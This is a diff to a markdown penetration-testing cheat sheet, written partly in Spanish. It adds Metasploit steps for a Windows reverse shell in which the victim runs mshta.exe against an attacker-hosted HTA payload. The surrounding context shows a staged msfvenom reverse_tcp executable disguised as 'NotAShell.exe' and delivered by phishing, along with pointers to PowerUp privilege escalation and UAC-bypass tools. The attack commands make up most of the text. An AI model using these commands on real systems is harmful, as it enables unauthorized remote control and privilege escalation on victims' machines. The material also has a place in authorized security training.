@@ -636,6 +636,16 @@ $ script -qc /bin/bash /dev/null
 		- **`run post/multi/recon/local_exploit_suggester`:** To see what we can use to upload privileges
 		- **`run post/windows/manage/enable_rdp`:** To open the remote desktop control
 		- **`run autoroute -h`:** Allows you to use the victim machine as a gateway to access other parts of the network
+	- You can get a reverse shell only using a HTTP request:
+	  ```
+	  # In Metasploit
+	  use exploit/windows/misc/hta_server
+	  set LHOST 443 # Optional, but can help in some cases
+	  exploit
+
+	  # Victim
+	  mshta.exe http://<ATTACKER_IP>:8080/<GENERATED_NAME>.hpa
+	  ```
 	- Let's see how to create a reverve shell with a staged payload (You will need a specific handler but it will be smaller) using phishing to a Windows system:
 		1. Usamos `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATACKER_IP> LPORT=53 -f exe -o NotAShell.exe` para crear el ejecutable que mandaremos
 		2. We will now need to launch Metasploit and wait for someone to run the created file before:
@@ -684,6 +694,8 @@ $ script -qc /bin/bash /dev/null
 
 		   [*] Exploit running as background job.
 		   ```
+	- [**PowerUp**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1): Poweshell module for privilege escalation, import it to Meterpreter using the Powershell module
+	- If you are not able to use the `getsystem` Meterpreter command to escalate maybe you need to bypass UAC. You can search for possible bypasses in Metasploit using the `post/multi/recon/local_exploit_suggester` module or use [UACME](https://github.com/hfiref0x/UACME)
 - [**Armitage**](https://github.com/rsmudge/armitage)**:** GUI para metasploit
 - [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Search for passwords by brute force through a protocol or web
 - [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)**:** SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools
